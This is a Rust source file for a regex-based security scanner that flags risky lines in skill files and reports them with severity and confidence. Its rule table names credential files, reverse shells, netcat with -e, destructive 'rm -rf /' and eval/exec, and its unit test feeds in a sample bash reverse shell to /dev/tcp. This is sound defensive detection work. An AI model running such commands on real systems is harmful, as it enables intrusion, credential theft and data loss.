//! Frozen MASB detector semantics retained as source signals, never direct scoring deductions.

use regex::Regex;
use serde_json::{Value, json};

use crate::{Error, Result};

struct Rule {
    id: &'static str,
    severity: &'static str,
    description: &'static str,
    expression: Regex,
    conjunction: Option<Regex>,
    confidence: f64,
}

pub(crate) struct Detector {
    rules: Vec<Rule>,
}

impl Detector {
    // Keep the frozen vendor rule table contiguous for direct provenance comparison.
    #[allow(clippy::too_many_lines)]
    pub fn new() -> Result<Self> {
        // Preserve the vendored detector implementation, including its per-line duplicate signals.
        let specifications = [
            (
                "NET001",
                "WARNING",
                "Detects direct external network access from a skill.",
                r#"(?i)\b(curl|wget)\b\s+https?://|\brequests\.(get|post|put|delete)\s*\(|\bfetch\s*\(\s*['\"]https?://"#,
                "",
                0.0,
            ),
            (
                "FILE001",
                "HIGH",
                "Detects access to credentials, keys, or environment files.",
                r"(?i)(^|/)\.ssh/|(^|/)\.env(\.|$)|id_rsa|id_dsa|id_ed25519|credentials\.json|api_keys\.conf",
                "",
                0.0,
            ),
            (
                "FILE002",
                "HIGH",
                "Detects destructive or broad file modification commands.",
                r"rm\s+-rf\s+/",
                "",
                0.95,
            ),
            (
                "FILE002",
                "HIGH",
                "Detects destructive or broad file modification commands.",
                r"chmod\s+777|chmod\s+a+rwx",
                "",
                0.85,
            ),
            (
                "FILE002",
                "HIGH",
                "Detects destructive or broad file modification commands.",
                r">\s+/(etc|usr|bin|sbin)/",
                "",
                0.90,
            ),
            (
                "CMD001",
                "HIGH",
                "Detects dangerous shell commands.",
                r"\bsudo\b",
                "",
                0.75,
            ),
            (
                "CMD001",
                "HIGH",
                "Detects dangerous shell commands.",
                r"rm\s+-rf\s+/",
                "",
                0.95,
            ),
            (
                "CMD001",
                "HIGH",
                "Detects dangerous shell commands.",
                r">\s*/dev/(tcp|udp|null)",
                "",
                0.90,
            ),
            (
                "CMD001",
                "HIGH",
                "Detects dangerous shell commands.",
                r"\bdd\s+.*of=/",
                "",
                0.90,
            ),
            (
                "CMD002",
                "WARNING",
                "Detects code paths that execute system commands.",
                r"\bos\.system\s*\(",
                "",
                0.80,
            ),
            (
                "CMD002",
                "WARNING",
                "Detects code paths that execute system commands.",
                r"subprocess\.(call|run|Popen).*shell\s*=\s*True",
                "",
                0.85,
            ),
            (
                "CMD002",
                "WARNING",
                "Detects code paths that execute system commands.",
                r"\bexec\s*\(",
                "",
                0.75,
            ),
            (
                "INJ001",
                "WARNING",
                "Detects dynamic code execution patterns.",
                r"\beval\s*\(|\bexec\s*\(",
                "",
                0.80,
            ),
            (
                "INJ001",
                "WARNING",
                "Detects dynamic code execution patterns.",
                r"__import__\s*\(",
                "",
                0.75,
            ),
            (
                "INJ001",
                "WARNING",
                "Detects dynamic code execution patterns.",
                r"\bcompile\s*\(",
                "",
                0.70,
            ),
            (
                "INJ001",
                "WARNING",
                "Detects dynamic code execution patterns.",
                r"(?i)(inject|insert|prepend).*into.*file",
                "",
                0.85,
            ),
            (
                "INJ003",
                "CRITICAL",
                "Detects reverse shell or backdoor-like payloads.",
                r"bash\s+-i\s+>&\s*/dev/tcp/",
                "",
                0.98,
            ),
            (
                "INJ003",
                "CRITICAL",
                "Detects reverse shell or backdoor-like payloads.",
                r"nc\s+-|netcat\s+-",
                r"-e\s+/",
                0.95,
            ),
            (
                "INJ003",
                "CRITICAL",
                "Detects reverse shell or backdoor-like payloads.",
                r"(?i)(if|when).*PROD.*then",
                r"(?i)(system|exec|eval|shell)",
                0.90,
            ),
            (
                "DEP001",
                "WARNING",
                "Detects global package installation.",
                r"(?i)pip\s+install.*--global",
                "",
                0.85,
            ),
            (
                "DEP001",
                "WARNING",
                "Detects global package installation.",
                r"(?i)npm\s+install.*-g|npm\s+i.*-g",
                "",
                0.85,
            ),
            (
                "DEP001",
                "WARNING",
                "Detects global package installation.",
                r"(?i)yarn\s+global",
                "",
                0.85,
            ),
            (
                "DEP002",
                "INFO",
                "Detects package force reinstall or broad upgrades.",
                r"(?i)install.*==.*force",
                "",
                0.70,
            ),
            (
                "DEP002",
                "INFO",
                "Detects package force reinstall or broad upgrades.",
                r"(?i)--upgrade|--force-reinstall",
                r"(?i)pip\s+install",
                0.75,
            ),
        ];
        let mut rules = Vec::new();
        for (id, severity, description, expression, conjunction, confidence) in specifications {
            let expression = Regex::new(expression)
                .map_err(|e| Error::Runtime(format!("frozen MASB pattern {id}: {e}")))?;
            let conjunction =
                if conjunction.is_empty() {
                    None
                } else {
                    Some(Regex::new(conjunction).map_err(|e| {
                        Error::Runtime(format!("frozen MASB conjunction {id}: {e}"))
                    })?)
                };
            rules.push(Rule {
                id,
                severity,
                description,
                expression,
                conjunction,
                confidence,
            });
        }
        Ok(Self { rules })
    }

    pub fn scan(&self, path: &str, content: &str) -> Vec<Value> {
        let excluded = [
            ".git",
            "__pycache__",
            "node_modules",
            ".venv",
            "venv",
            "dist",
            "build",
            ".pytest_cache",
        ];
        let extension = std::path::Path::new(path)
            .extension()
            .and_then(std::ffi::OsStr::to_str)
            .unwrap_or_default();
        if path.split('/').any(|part| excluded.contains(&part))
            || ![
                "md", "txt", "py", "js", "ts", "sh", "bash", "yml", "yaml", "json", "toml",
            ]
            .contains(&extension)
        {
            return Vec::new();
        }
        let mut findings = Vec::new();
        for rule in &self.rules {
            for (index, line) in content.split('\n').enumerate() {
                if !rule.expression.is_match(line)
                    || rule.conjunction.as_ref().is_some_and(|r| !r.is_match(line))
                {
                    continue;
                }
                let lower = line.to_lowercase();
                if rule.id == "NET001"
                    && ["github.com", "pypi.org", "npmjs.com"]
                        .iter()
                        .any(|domain| lower.contains(domain))
                {
                    continue;
                }
                let confidence = if rule.confidence == 0.0 {
                    let mut confidence: f64 = 0.7;
                    if line.contains('#') || line.contains("//") {
                        confidence -= 0.2;
                    }
                    if [
                        "password",
                        "secret",
                        "token",
                        "key",
                        "credential",
                        "eval",
                        "exec",
                        "system",
                        "shell",
                        "bash",
                        "curl",
                        "wget",
                        "nc ",
                        "netcat",
                    ]
                    .iter()
                    .any(|word| lower.contains(word))
                    {
                        confidence += 0.2;
                    }
                    if rule.id == "FILE001"
                        && ["~/.ssh", "~/.env", "id_rsa", "private key"]
                            .iter()
                            .any(|word| lower.contains(word))
                    {
                        confidence += 0.2;
                    }
                    confidence.clamp(0.0, 1.0)
                } else {
                    rule.confidence
                };
                findings.push(json!({"scanner":"masb","ref":format!("source:{path}:{}",index+1),"detail":{"rule_id":rule.id,"severity":rule.severity,"file":path,"line":index+1,"pattern":line.trim(),"description":rule.description,"confidence":confidence}}));
            }
        }
        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn preserves_frozen_rule_conjunctions_duplicates_and_allowlist() {
        let detector = Detector::new().expect("frozen patterns compile");
        let hits=detector.scan("run.sh","sudo rm -rf /tmp/demo\ncurl https://github.com/a\nbash -i >& /dev/tcp/host/1\npip install a --upgrade\n");
        assert_eq!(hits.len(), 5);
        assert_eq!(
            hits.iter()
                .filter(|h| h["detail"]["rule_id"] == "CMD001")
                .count(),
            2
        );
        assert_eq!(
            hits.iter()
                .filter(|h| h["detail"]["rule_id"] == "INJ003")
                .count(),
            1
        );
        assert!(
            detector
                .scan("node_modules/a.sh", "sudo rm -rf /")
                .is_empty()
        );
        assert!(detector.scan("run.sh", "nc -l localhost").is_empty());
    }
}
